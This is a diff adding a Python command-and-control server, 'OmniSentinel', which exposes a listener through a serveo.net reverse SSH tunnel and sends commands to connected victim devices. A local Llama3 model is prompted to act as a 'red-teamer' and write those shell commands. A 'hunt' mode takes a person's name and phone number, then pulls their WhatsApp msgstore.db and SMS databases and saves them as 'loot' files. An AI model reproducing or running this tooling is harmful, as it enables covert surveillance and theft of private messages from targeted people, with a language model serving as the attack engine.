@@ -1,0 +1,93 @@
+import requests, subprocess, socket, threading, os, re, time, random, string
+
+# --- GLOBAL CONFIG ---
+OLLAMA_URL = "http://localhost:11434/api/generate"
+MODEL = "llama3"
+LPORT = 8888
+
+class OmniSentinelMaster:
+    def __init__(self):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.gateway = ""
+
+    def generate_tunnel(self):
+        subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R {subdomain}:80:localhost:{LPORT} serveo.net", 
+                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.gateway = f"{subdomain}.serveo.net"
+        return self.gateway
+
+    def ai_engine(self, task):
+        prompt = f"Act as a master red-teamer. Task: {task}. Output ONLY the raw terminal command."
+        try:
+            r = requests.post(OLLAMA_URL, json={'model': MODEL, 'prompt': prompt, 'stream': False}, timeout=45)
+            return r.json()['response'].strip().replace('`', '')
+        except: return None
+
+    # --- UPDATED: TARGET HUNTER & DATA EXTRACTOR ---
+    def target_hunter_extractor(self, client):
+        print("\n" + "="*50)
+        print(" [!] INITIALIZING TARGET INTEL & EXTRACTION ")
+        print("="*50)
+        t_name = input("[?] Target Name/Device: ")
+        t_num = input("[?] Target Phone Number: ")
+        
+        print(f"[*] AI is scouting for: {t_name} | {t_num}")
+        
+        # ১. টার্গেট ভেরিফিকেশন এবং মেসেজ এক্সট্রাকশন লজিক
+        hunt_task = f"Find device for {t_name} ({t_num}). If found, locate WhatsApp 'msgstore.db' and SMS databases. Generate a search and dump command."
+        hunt_cmd = self.ai_engine(hunt_task)
+        
+        print(f"[*] Strategy Map: {hunt_cmd}")
+        time.sleep(2)
+        
+        confirm = input(f"\n[!!!] Target {t_name} detected. Pull WhatsApp/SMS history? (y/n): ")
+        if confirm.lower() == 'y':
+            print(f"[+] Locking on. Extracting databases for {t_num}...")
+            # কমান্ড পাঠানো এবং ডেটা রিসিভ করা (Base64 এ ট্রান্সফার করা নিরাপদ)
+            client.send(hunt_cmd.encode())
+            raw_data = client.recv(1048576).decode(errors='ignore')
+            
+            # ডেটা সেভ করা
+            with open(f"loot_{t_num}.txt", "w") as f:
+                f.write(raw_data)
+            print(f"[#] Extraction complete. Saved to: loot_{t_num}.txt")
+        else:
+            print("[-] Extraction aborted.")
+
+    def handle_session(self, client, addr):
+        print(f"\n[!] INCOMING CONNECTION: {addr[0]}")
+        while True:
+            try:
+                task = input(f"\nGod-Mode@{addr[0]}:~# ")
+                if not task: continue
+
+                if task.lower() == "hunt":
+                    self.target_hunter_extractor(client)
+                    continue
+
+                cmd = self.ai_engine(task)
+                print(f"[>] Action: {cmd}")
+                client.send(cmd.encode())
+                print(f"\n[OUTPUT]\n{client.recv(1048576).decode(errors='ignore')}")
+                
+            except: break
+
+    def launch(self):
+        os.system('clear')
+        self.generate_tunnel()
+        print("="*60)
+        print("   OMNI-SENTINEL: TARGET HUNTER & DATA EXTRACTOR   ")
+        print("="*60)
+        print(f"[*] GATEWAY: {self.gateway}")
+        print("[!] TYPE 'hunt' TO LOCATE AND DUMP MESSAGES")
+        
+        self.server.bind(("0.0.0.0", LPORT))
+        self.server.listen(100)
+        while True:
+            c, a = self.server.accept()
+            threading.Thread(target=self.handle_session, args=(c, a)).start()
+
+if __name__ == "__main__":
+    OmniSentinelMaster().launch()
